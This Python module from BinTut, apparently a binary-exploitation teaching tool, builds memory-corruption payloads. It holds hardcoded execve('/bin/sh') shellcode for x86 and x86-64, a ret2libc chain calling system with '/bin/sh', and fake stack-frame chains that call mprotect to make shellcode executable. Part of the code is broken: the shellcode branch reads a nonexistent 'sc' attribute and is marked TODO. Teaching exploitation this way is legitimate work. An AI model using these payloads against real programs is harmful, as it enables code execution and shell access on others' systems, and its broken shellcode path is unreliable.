"""
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This file is part of BinTut.

BinTut is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

BinTut is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with BinTut.  If not, see <http://www.gnu.org/licenses/>.
"""


from __future__ import division, absolute_import, print_function

from .init import red
from .helpers import Addr, get_size_of_pointer
from .utils import p32


# /usr/include/asm-generic/mman-common.h
# #define PROT_READ	0x1		/* page can be read */
# #define PROT_WRITE	0x2		/* page can be written */
# #define PROT_EXEC	0x4		/* page can be executed */

PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC


def mprotect(offset, addr):
    # TODO: Support adding shellcode.
    shellcode = Shellcode()
    size_of_pointer = get_size_of_pointer()
    sc_addr = hex(int(addr, 16) + 2*size_of_pointer)
    frames = (
        Faked(offset=offset, address=addr) + shellcode +
        Faked('mprotect', [align_to_page(sc_addr), 4096, PROT_RWX]) +
        Faked(next_address=sc_addr))
    print(red(sc_addr))
    return frames.payload


class Payload(object):
    bits = 32
    pointer_size = 4 if bits == 32 else 8

    def __init__(self, payload):
        self.payload = payload

    def compose(self):
        return self.payload

    def __add__(self, other):
        return self.__class__(self.compose() + other.compose())


class Fill(Payload):
    def __init__(self, count, byte=b'A'):
        self.count = count
        self.byte = byte

    def compose(self):
        return self.count * self.byte

    def __add__(self, other):
        return Payload(self.compose() + other.compose())


class Plain(Payload):
    def __init__(self, address):
        self.address = address

    def compose(self):
        return p32(self.address)


class Nop(Fill):
    def __init__(self, count):
        Fill.__init__(self, count, b'\x90')


class Shellcode(Payload):
    def __init__(self):
        self.sc32 = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f" \
                    b"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" \
                    b"\x80"
        self.sc64 = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f" \
                    b"\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31" \
                    b"\xd2\x0f\x05"

    def compose(self):
        return self.sc32 if self.bits == 32 else self.sc64


class Ret2Fun(Payload):
    def __init__(self):
        pass

    def compose(self):
        system = Addr('system', self.bits)
        binsh = Addr('/bin/sh', self.bits)
        exit_addr = Addr('exit', self.bits)
        exit_code = b'\x00' * self.pointer_size
        return p32(system) + p32(exit_addr) + p32(binsh) + exit_code


class Faked(object):
    """A faked frame.

    Three valid use cases are as follows:
    Faked(name, args) is a normal frame,
    Faked(offset=offset, address=address) the starting frame, and
    Faked(address=address, payload=payload) the resulting frame.
    """
    filling_byte = b'A'

    def __init__(self, name=None, args=None, offset=None,
                 address=None, payload=None, next_address=None):
        self.offset = offset
        self.address = address
        self.name = name

        if args is None:
            self.args = []
        else:
            self.args = args

        self.size_of_pointer = get_size_of_pointer()

        if self.offset:
            # Construct the starting faked frame.
            self.payload = (
                self.filling_byte*(offset-self.size_of_pointer) +
                p32(self.address) +
                p32(Addr('leave_ret')))
        else:
            self.payload = payload

        self.next_address = next_address

    def __add__(self, other):
        """Combine two faked frames.

        Expected left operands should be either
        the starting faked frame or resulting frames constructed by
        a previous combination, while right operands a normal frame.
        """
        if isinstance(other, Shellcode):
            # TODO: Support adding shellcode.
            address = hex(int(self.address, 16) + len(other.sc))
            payload = (
                self.filling_byte*(
                    self.offset-self.size_of_pointer) +
                p32(address) + p32(Addr('leave_ret')) + other.sc)
        elif other.next_address:
            address = other.next_address
            payload = (
                self.payload + p32(address) + p32(address) +
                p32(Addr('leave_ret')))
        else:
            address = hex((int(self.address, 16) +
                           3*self.size_of_pointer +
                           len(other.args)*self.size_of_pointer))
            payload = (self.payload +
                       p32(address) + p32(Addr(other.name)) +
                       p32(Addr('leave_ret')) + other.make_args())
        # Construct a resulting frame.
        return self.__class__(address=address, payload=payload)

    def make_args(self):
        """Prepare stack arguments for the function in the frame.

        For the time being, it handles strings and integrals.
        """
        args = b''
        for arg in self.args:
            if isinstance(arg, int):
                args += p32('{:#010x}'.format(arg))
            elif isinstance(arg, str):
                args += p32(Addr(arg))
            else:
                raise ValueError
        return args
